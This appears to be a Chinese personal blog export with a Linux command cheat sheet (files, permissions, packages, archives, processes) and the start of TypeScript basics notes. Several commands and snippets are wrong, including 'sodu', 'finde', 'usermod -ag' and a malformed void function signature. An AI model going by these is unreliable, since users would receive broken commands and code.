<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ls --color=auto	<span class="comment">//开启颜色标注  红色-&gt;压缩文件   浅蓝色-&gt;链接文件  灰色-&gt;其他文件</span></span><br><span class="line">ls --color=none	<span class="comment">//关闭颜色标注</span></span><br><span class="line">ls -a	<span class="comment">//显示所有的文件和目录，包括隐藏的</span></span><br><span class="line">ls -l	<span class="comment">//列出一个显示文件和目录的详细信息的列表，每个文件和目录都有一行详细的信息</span></span><br><span class="line">ls -h	<span class="comment">//以K,M,G为单位的形式显示文件大小</span></span><br><span class="line">ls -t	<span class="comment">//按文件最近一次修改时间排序</span></span><br><span class="line">ls -i	<span class="comment">//显示文件的inode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ls的常用参数合并在一次使用，效果是叠加的</span></span><br><span class="line">ls -alth</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>cd</code>：切换目录</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cd /	<span class="comment">//切换到根目录</span></span><br><span class="line">cd ~	<span class="comment">//切换到家目录</span></span><br><span class="line">cd		<span class="comment">//cd命令不加参数默切换到家目录</span></span><br><span class="line">cd ..	<span class="comment">//切换到上级目录</span></span><br><span class="line">cd ../..	<span class="comment">//切换到上上级目录</span></span><br><span class="line">cd /usr/bin	<span class="comment">//切换到usr-&gt;bin目录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>tip：之前的Tab键也可以用到路径的补全上。</p>
</li>
<li><p><code>du</code>：英语disk usage的缩写，表示“磁盘使用/占用”，该命令可以让我们知道文件和目录所占的空间大小，相比<code>ls -l</code>命令，<code>du</code>命令统计的才是真正的文件大小。<code>du</code>命令会深入遍历每个目录的子目录，统计所有文件的大小</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">du	<span class="comment">//列出所有文件的大小并统计当前目录的总大小</span></span><br><span class="line">du -s	<span class="comment">//只看当前目录的总大小</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="5、操纵文件"><a href="#5、操纵文件" class="headerlink" title="5、操纵文件"></a>5、操纵文件</h6><ul>
<li><p>显示文件内容</p>
<ul>
<li><p><code>cat</code>：一次性在终端汇总显示文件的所有内容，在命令后面加上文件路径即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cat hello.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>less</code>：和<code>cat</code>命令不同的是，<code>less</code>命令会分页的显示文件内容,分页内容的多少根据终端屏幕来界定 ，配合键盘空格、上下键、回车键进行阅读</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">less hello.txt</span><br></pre></td></tr></table></figure>

<p><code>d</code>键：前进半页</p>
<p><code>u</code>键：后退半页</p>
<p><code>b</code>键：后退一页，与PageUp(上一页)效果一样</p>
<p><code>space</code>空格键：前进整页</p>
<p><code>y</code>键：后退一行，与向上键效果一样</p>
<p><code>q</code>键：停止读取文件，终止<code>less</code>命令</p>
<p><code>=</code>号：显示你当前在文件处于的位置</p>
<p><code>h</code>键：显示帮助文档。<code>q</code>键退出帮助文档</p>
<p><code>/</code>：进入搜索模式，搜索完按<code>n</code>键到下一个搜索结果，<code>N</code>键到上一个搜索结果</p>
</li>
<li><p><code>more</code>：类似<code>less</code>分页显示内容，<code>more</code>没有<code>less</code>那么强大，比如不能往后翻页，只能往前</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">more hello.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>head</code>：显示文件的开头几行，默认10行，如果要指定显示的行数，可以用<code>-n 行数</code>参数来指定几行</p>
</li>
<li><p><code>tail</code>：显示文件结尾的几行，用法和<code>head</code>类似，而且该命令配合<code>-f</code>参数可以实时追踪文件的更新，频率是1秒检查一次文件是否有新内容，如果要指定间隔检查的时间，用<code>-s</code>参数，<code>tail -f -s 4 filename</code>，使用<code>Ctrl + c</code>退出追踪状态</p>
</li>
</ul>
</li>
<li><p>创建文件</p>
<ul>
<li><p><code>touch</code>：创建空白文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">touch new_file	<span class="comment">//创建一个新文件</span></span><br><span class="line">touch new_file1 new_file2	<span class="comment">//同时创建多个新文件</span></span><br><span class="line">touch <span class="string">&#x27;filename with space&#x27;</span> <span class="comment">//如果创建的文件名有空格，使用双引号</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>创建目录</p>
<ul>
<li><p><code>mkdir</code>：创建一个目录 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mkdir new_folder	<span class="comment">//创建目录new_folder</span></span><br><span class="line">mkdir -p one/two/three	<span class="comment">//使用-p参数来递归创建目录结构</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>复制文件或目录</p>
<ul>
<li><p><code>cp</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cp file file_copy	<span class="comment">//复制文件file为file_copy</span></span><br><span class="line">cp file ../file_copy	<span class="comment">//复制文件file到上一级目录中</span></span><br><span class="line">cp -r folder folder_copy	<span class="comment">//复制文件夹folder为folder_copy</span></span><br><span class="line">cp *.txt folder	把当前目录下所有的txt后缀的文件拷贝到folder目录中</span><br><span class="line">cp ha* folder	<span class="comment">//把当前目录以ha开头的文件都拷贝到folder目录中</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>移动文件</p>
<ul>
<li><p><code>mv</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mv file one/file	<span class="comment">//将当前文件下的file文件移动到one目录下</span></span><br><span class="line">mv file file_mv	<span class="comment">//将file文件改名为file_mv</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>删除文件和目录</p>
<ul>
<li><p><code>rm</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rm file1	<span class="comment">//删除文件file1</span></span><br><span class="line">rm file1 file2	<span class="comment">//同时删除文件file1和file2</span></span><br><span class="line">rm -i file	<span class="comment">//删除文件前向用户确认</span></span><br><span class="line">rm -r folder	<span class="comment">//删除folder目录</span></span><br><span class="line">rm -f file1	<span class="comment">//强制删除文件file1，不经过询问确认</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>查找文件</p>
<ul>
<li><p><code>locate</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">locate &lt;filename&gt;	<span class="comment">//查找文件，如果是刚创建的就会搜索不到</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>find</code>命令</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">finde &lt;filename&gt;	<span class="comment">//查找文件，包括刚创建的文件</span></span><br><span class="line">find /<span class="keyword">var</span> -size +<span class="number">10</span>M <span class="comment">//查找/var中大小超过10M的文件</span></span><br><span class="line">find /<span class="keyword">var</span> -size <span class="number">-50</span>k <span class="comment">//查找/var中大小小于50k的文件</span></span><br><span class="line">find /<span class="keyword">var</span> -size <span class="number">10</span>k	<span class="comment">//查找/var中大小等于10k的文件</span></span><br><span class="line">find  -name <span class="string">&quot;*.txt&quot;</span> -atime <span class="number">-7</span>	<span class="comment">//根据文件的最近7天访问时间查找名字以.txt为后缀的文件</span></span><br><span class="line">find -type d -name <span class="string">&quot;test&quot;</span>	<span class="comment">//只查找查找名字包含test的目录</span></span><br><span class="line">find -type f -name <span class="string">&quot;test&quot;</span>	<span class="comment">//只查找名字包含test的文件，如果不是用-type参数指定类型，默认同时查找目录和文件</span></span><br><span class="line">find -name <span class="string">&quot;test&quot;</span> -<span class="keyword">delete</span>	<span class="comment">//找到文件后对文件进行删除操作</span></span><br><span class="line">find -name <span class="string">&quot;test&quot;</span> -exec chmod <span class="number">600</span> &#123;&#125; \; <span class="comment">//查找到文件并进行权限修改操作</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>创建链接</p>
<p>相关概念：</p>
<blockquote>
<p><strong>Linux下有两种链接类型</strong>：</p>
<ul>
<li>Physical link：物理链接或硬链接</li>
<li>Symbolic link：符号链接或软链接</li>
</ul>
<p><strong>文件的存储</strong>：</p>
<ul>
<li>每个文件有三部分：文件名、权限和文件内容</li>
<li>每个文件的文件内容被分配到一个表示号码，就是inode</li>
<li>每个文件名都绑定到它的文件内容（用inode标识）</li>
</ul>
<p><strong>硬链接原理</strong>：使链接的两个文件共享同样文件内容，就是同样的inode，一旦文件1和文件2之间有了硬链接，那么你修改文件1或文件2，修改的是相同的一块内容 ，只不过可以用两个文件名来取到文件内容</p>
<p><strong>硬链接缺陷</strong>：只能创建指向文件的硬链接，不能创建指向目录的，通过一些参数的修改，也可以指向目录的硬链接，但比较复杂，软链接可以指向文件或目录。对于目录，一般都是用软链接</p>
<p>对<strong>硬链接</strong>来说，删除任意一方的文件，共同指向的文件内容并不会从硬盘上被删除</p>
<p>对<strong>软链接</strong>来说，删除软链接文件后，原文件不会受到影响，如果删除原文件，对应的软链接就会变成“死链接”，因为其指向的文件不见了</p>
<p>软链接可以指向目录，硬链接不行</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ln file1 file2 <span class="comment">//创建一个文件file2，使其成为file1的硬链接</span></span><br><span class="line">ln -s file1 file2 <span class="comment">//为file1创建软链接file2</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="6、用户权限相关"><a href="#6、用户权限相关" class="headerlink" title="6、用户权限相关"></a>6、用户权限相关</h6><ul>
<li><p>普通用户以root身份运行命令</p>
<ul>
<li><code>sodu &lt;command&gt;</code>   输入该命令后，需要输入密码才能使用root身份执行相关命令，临时成为root身份</li>
<li><code>sudo su</code> 一直成为root用户，也是需要输入密码，如果要退出root身份，使用回普通用户身份，可以使用<code>exit</code>命令</li>
<li><code>su</code>  使用root身份执行命令，也是需要输入密码，不过这时候输入的密码是root的密码，而不是普通用户的密码</li>
</ul>
</li>
<li><p>添加新用户</p>
<ul>
<li><code>useradd &lt;username&gt;</code></li>
</ul>
</li>
<li><p>修改密码</p>
<ul>
<li><code>passwd &lt;username&gt;</code></li>
</ul>
</li>
<li><p>删除用户</p>
<ul>
<li><code>userdel &lt;username&gt;</code></li>
<li><code>userdel -r/--remove &lt;username&gt;</code> 连同<code>/home/username</code>目录一起删掉</li>
</ul>
</li>
<li><p>新增群组</p>
<ul>
<li><code>groupadd &lt;groupname&gt;</code></li>
</ul>
</li>
<li><p>修改用户账户</p>
<ul>
<li><code>usermod -g &lt;groupname&gt; &lt;username&gt;</code>将用户放到某个群组里面，会将用户从原有群组移除，再添加到新的指定群组</li>
<li><code>usermod -G &lt;groupname1&gt;,&lt;groupname2&gt;</code>将用户同时放到多个群组里面，会将用户从原有群组移除，再添加到新的指定群组</li>
<li><code>usermod -ag &lt;groupname&gt;</code>将用户添加到groupname群组里面，同时保留其原在群组</li>
</ul>
</li>
<li><p>查看用户属于哪些群组</p>
<ul>
<li><code>groups &lt;usernmae&gt;</code></li>
</ul>
</li>
<li><p>删除群组</p>
<ul>
<li><code>groupdel &lt;groupname&gt;</code></li>
</ul>
</li>
<li><p>修改文件的所有者和群组</p>
<ul>
<li><code>chown &lt;username&gt; &lt;filename&gt;</code>改变文件的所有者</li>
<li><code>chown -R &lt;username&gt; &lt;foldername&gt;</code>改变目录所有者</li>
<li><code>chgrp &lt;groupname&gt; &lt;filename&gt;</code>改变文件所在的群组 </li>
<li><code>chown &lt;username&gt;:&lt;groupname&gt; &lt;filename&gt;</code>同时修改文件所有者和所在群组</li>
</ul>
</li>
<li><p>修改权限</p>
<ul>
<li><p><code>chmod 600 &lt;filename&gt;</code></p>
<table>
<thead>
<tr>
<th>权限</th>
<th>数字</th>
<th>计算</th>
</tr>
</thead>
<tbody><tr>
<td>—</td>
<td>0</td>
<td>0+0+0</td>
</tr>
<tr>
<td>r–</td>
<td>4</td>
<td>4+0+0</td>
</tr>
<tr>
<td>-w-</td>
<td>2</td>
<td>0+2+0</td>
</tr>
<tr>
<td>–x</td>
<td>1</td>
<td>0+0+1</td>
</tr>
<tr>
<td>rw-</td>
<td>6</td>
<td>4+2+0</td>
</tr>
<tr>
<td>-wx</td>
<td>3</td>
<td>0+2+1</td>
</tr>
<tr>
<td>r-x</td>
<td>5</td>
<td>4+0+1</td>
</tr>
<tr>
<td>wrx</td>
<td>7</td>
<td>4+2+1</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h6 id="7、软件安装"><a href="#7、软件安装" class="headerlink" title="7、软件安装"></a>7、软件安装</h6><p>  相关概念：</p>
<blockquote>
<p><strong>软件包 Package</strong>：软件的所有文件的压缩包，二进制形式的包含了安装软件的所有指令，在Red Hat一族里，软件包的后缀是<code>.rpm</code></p>
<p><strong>rpm</strong>：是Red Hat Package Manager的缩写，表示“红帽软件包管理器”</p>
<p>Centos作为<strong>Red Hat一族</strong>的一员，也是用<code>.rpm</code>的软件包</p>
<p><strong>Debian一族</strong>（Ubuntu，Debian等）的软件包是<code>.deb</code>为后缀</p>
<p>Linux的软件包都存放在一个地方，叫做<strong>软件仓库（repository）</strong></p>
<p>软件仓库不只是存放在一台服务器上，全球有很多个软件仓库（也就是有很多服务器）</p>
</blockquote>
<ul>
<li><p>更换软件仓库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">修改/etc/yum.repos.d/CentOS-Base.repo文件更换仓库地址</span><br></pre></td></tr></table></figure>

<p>CentosOS官方的软件源列表：<a href="https://www.centos.org/download/mirrors">https://www.centos.org/download/mirrors</a></p>
</li>
<li><p>包管理</p>
<ul>
<li><code>yum</code><ul>
<li><code>yum update/upgrade</code>：更新软件包，如果后面不带具体的软件包名称，就会升级所有的软件包</li>
<li><code>yum search &lt;package-name&gt;</code>：搜索软件包</li>
<li><code>yum install &lt;package-name&gt;</code>：安装软件包</li>
<li><code>yum remove/autoremove &lt;package-name&gt;</code>：删除软件包</li>
<li><code>yum localinstall *.rpm</code>：安装本地的.rpm软件包</li>
<li><code>yum remove &lt;package-name&gt;</code>：卸载本地的.rpm软件包</li>
</ul>
</li>
<li><code>rpm</code><ul>
<li><code>sudo rpm -i *.rpm</code>：安装本地的.rpm软件包</li>
<li><code>sudo rpm -e &lt;package-name&gt;</code>：卸载本地的.rpm软件包</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="8、文件的解压和压缩"><a href="#8、文件的解压和压缩" class="headerlink" title="8、文件的解压和压缩"></a>8、文件的解压和压缩</h6><ul>
<li><p><code>tar</code>命令：归档</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tar -cvf sorting.tar sorting/	<span class="comment">//创建一个tar归档 参数c-&gt;创建 v-&gt;显示操作的细节 f-&gt;归档文件</span></span><br><span class="line">tar -cvf file1 file2 file3</span><br><span class="line">tar -tf sorting.tar	<span class="comment">//显示归档的内容，但是不解开归档</span></span><br><span class="line">tar -rvf archive.tar file_extra.txt	<span class="comment">//追加文件到归档</span></span><br><span class="line">tar -xvf archive.tar	<span class="comment">//将生成的归档解开</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>gzip</code>命令：压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gzip archive.tar	<span class="comment">//压缩归档，生成文件archive.tar.gz</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>bzip2</code>命令：压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bzip2 archive.tar	<span class="comment">//压缩归档，生成文件archive.tar.bz2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>gunzip</code>命令：解压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gunzip archive.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>bunzip2</code>命令：解压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bunzip2 archive.tar.bz2</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-zcvf</code>参数：归档并压缩</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tar -zcvf sorting.tar sorting/	<span class="comment">//归档并压缩</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>-zxvf</code>参数：解压并解开归档</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tar -zxvf sorting.tar.gz	<span class="comment">//解压并解开归档</span></span><br><span class="line">tar -jxvf sorting.tar.bz2</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>zcat、zmore、zless</code>命令：查看gzip压缩文件内容</p>
</li>
<li><p><code>bzcat、bzmore、bzless</code>命令：查看bzip2压缩文件内容</p>
</li>
<li><p><code>zip</code>命令：压缩文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">zip -r sorting.zip sorting	<span class="comment">//压缩成sorting.zip文件 </span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p><code>unzip</code>命令：解压zip文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">unzip archive.zip	<span class="comment">//解压.zip文件</span></span><br><span class="line">unzip -l archive.zip	<span class="comment">//不解开.zip文件，只看其中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果没有unzip命令 可以通过以下方式安装</span></span><br><span class="line">sudo yum install unzip</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="9、进程和系统监测"><a href="#9、进程和系统监测" class="headerlink" title="9、进程和系统监测"></a>9、进程和系统监测</h6><ul>
<li><p><code>w</code>：帮助快速了解系统中目前有哪些用户登录着以及他们在干什么，还可以查看负载</p>
</li>
<li><p><code>tload</code>：查看负载曲线图</p>
</li>
<li><p><code>ps</code>命令：列出运行的进程列表，显示的进程列表不会随时间而更新，是静态的，类似进程的快照snapshot</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ps -ef	<span class="comment">//列出所有用户在所有终端的所有进程</span></span><br><span class="line">ps -ef | less <span class="comment">//配合less查看</span></span><br><span class="line">ps -aux	<span class="comment">//通过CPU和内存使用来过滤进程</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pstree</code>：以树形结构显示进程</p>
</li>
</ul>
<h6 id="10、操作进程和重启关闭系统"><a href="#10、操作进程和重启关闭系统" class="headerlink" title="10、操作进程和重启关闭系统"></a>10、操作进程和重启关闭系统</h6><ul>
<li><code>top</code>：进程的动态列表，使用<code>q</code>退出</li>
<li><code>kill</code>：结束一个进程</li>
<li><code>halt</code>：关闭系统</li>
<li><code>reboot</code>：重启系统</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>系统</tag>
      </tags>
  </entry>
  <entry>
    <title>TypeScript笔记整理</title>
    <url>/20200928/094824.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>Javascript是一门很自由的动态语言，这种风格有好处也有坏处，只是如果所处的项目比较大型的话，就需要一种<strong>类型安全</strong>的机制，而TypeScript就提供了这样的能力。</p>
<p>TypeScript是Javascript的超集，可以编译成纯Javascript，可以在任何浏览器、计算机、操作系统上面运行。TypeScript支持类型声明、泛型、接口、枚举、装饰器等特性，在编译阶段就能帮我们发现程序中不合理的地方，使程序更健壮，同时也能帮助我们<strong>重塑类型思维</strong>。</p>
</blockquote>
<a id="more"></a>

<h5 id="安装使用环境"><a href="#安装使用环境" class="headerlink" title="安装使用环境"></a>安装使用环境</h5><p>全局安装typscript</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install -g typescript</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">yarn <span class="built_in">global</span> add typescript</span><br></pre></td></tr></table></figure>

<p>这样，你就能使用<code>tsc</code>命令来编译<code>.ts</code>后缀的文件，再使用<code>node</code>命令执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tsc index.ts	<span class="comment">// 将index.ts编译成index.js</span></span><br><span class="line">node index.js</span><br></pre></td></tr></table></figure>

<p>如果想简单一点，直接编译运行，可以安装<code>ts-node</code>插件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install -g ts-node</span><br><span class="line"><span class="comment">// or </span></span><br><span class="line">yarn <span class="built_in">global</span> add ts-node</span><br></pre></td></tr></table></figure>

<p>这样，就可以直接使用<code>ts-node</code>命令来执行<code>.ts</code>后缀的文件了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ts-node index.ts</span><br></pre></td></tr></table></figure>

<h5 id="1、基础类型"><a href="#1、基础类型" class="headerlink" title="1、基础类型"></a>1、基础类型</h5><h6 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num: number = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<h6 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str: string = <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h6 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> isFlag: boolean = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<h6 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h6><p>第一种方式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> strArr: string[] = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> numArr: number[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></figure>

<p>第二种方式，使用数组泛型<code>Array&lt;元素类型&gt;</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> boolArr: <span class="built_in">Array</span>&lt;boolean&gt; = [<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>];</span><br></pre></td></tr></table></figure>

<h6 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h6><p>限定数组个数和类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> tuple: [string,number,boolean] = [<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="literal">true</span>];</span><br></pre></td></tr></table></figure>

<h6 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h6><p>使用枚举<code>enum</code>类型可以为衣组数值赋予有好的语义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">    Red,</span><br><span class="line">    Green,</span><br><span class="line">    Blue</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> color:Color = Color.Blue;</span><br></pre></td></tr></table></figure>

<p>转换成js如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> Color;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">Color</span>) </span>&#123;</span><br><span class="line">    Color[Color[<span class="string">&quot;Red&quot;</span>] = <span class="number">0</span>] = <span class="string">&quot;Red&quot;</span>;</span><br><span class="line">    Color[Color[<span class="string">&quot;Green&quot;</span>] = <span class="number">1</span>] = <span class="string">&quot;Green&quot;</span>;</span><br><span class="line">    Color[Color[<span class="string">&quot;Blue&quot;</span>] = <span class="number">2</span>] = <span class="string">&quot;Blue&quot;</span>;</span><br><span class="line">&#125;)(Color || (Color = &#123;&#125;));</span><br><span class="line"><span class="keyword">let</span> color = Color.Blue;</span><br></pre></td></tr></table></figure>

<p>默认枚举值是从0开始，然后枚举值和名称是可以相互索引得到。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Color.red=<span class="number">0</span>;</span><br><span class="line">Color[<span class="number">0</span>]=<span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>

<p>枚举值默认从0开始，如果你不想从0开始，可以自己进行设置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">    Red = <span class="number">1</span>,</span><br><span class="line">    Green,</span><br><span class="line">    Blue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以手动设置所有枚举值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">    Red = <span class="number">2</span>,</span><br><span class="line">    Green = <span class="number">5</span>,</span><br><span class="line">    Blue = <span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Any"><a href="#Any" class="headerlink" title="Any"></a>Any</h6><p>在遇到一些不确定类型的时候，可以使用<code>any</code>类型来标记</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> notSure: any = [<span class="number">1</span>,<span class="number">2</span><span class="string">&#x27;232&#x27;</span>,<span class="literal">true</span>];</span><br></pre></td></tr></table></figure>

<h6 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h6><p><code>void</code>表示没有任何类型，当一个函数没有返回值时，可以声明其返回值为<code>void</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMessage</span>: <span class="title">void</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;this is some message&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Null和Undefined"><a href="#Null和Undefined" class="headerlink" title="Null和Undefined"></a>Null和Undefined</h6><p><code>null</code>和<code>undefined</code>本身的类型用处不大</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure>

<h6 id="Never"><a href="#Never" class="headerlink" title="Never"></a>Never</h6><p><code>Never</code>类型表示的是那些永不存在值的类型，存在永不可能到达的终点，例如抛出异常和死循环等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">errLog</span>(<span class="params">message: string</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>);	<span class="comment">//这句代码永远不可能执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showSomething</span>(<span class="params"></span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>);	<span class="comment">//这句代码永远不可能执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h6><p><code>object</code>表示非原始类型，就是除了<code>number</code>,<code>string</code>,<code>boolean</code>,<code>symbol</code>,<code>null</code>或<code>undefined</code>之外的类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">o: object</span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(o.msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">create(&#123;<span class="attr">msg</span>:<span class="string">&#x27;type object&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h5 id="2、接口"><a href="#2、接口" class="headerlink" title="2、接口"></a>2、接口</h5><blockquote>
<p>TypeScript的核心原则之一是对值所具有的<em>结构</em>进行类型检查。 它有时被称做“鸭式辨型法”或“结构性子类型化”。 在TypeScript里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。</p>
</blockquote>
<h6 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    brand: string,</span><br><span class="line">    price: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCarInfo</span>(<span class="params">carobj: Car</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>&#125;;</span><br><span class="line">showCarInfo(obj);</span><br></pre></td></tr></table></figure>

<p>上面的代码规定了传进来的参数要按照接口<code>Car</code>的类型，必须存在一个<code>brand</code>属性和一个<code>price</code>属性</p>
<h6 id="可选属性"><a href="#可选属性" class="headerlink" title="可选属性"></a>可选属性</h6><p>如果有些属性是可传可不传的话，可以使用<code>?</code>来标记为可选属性</p>
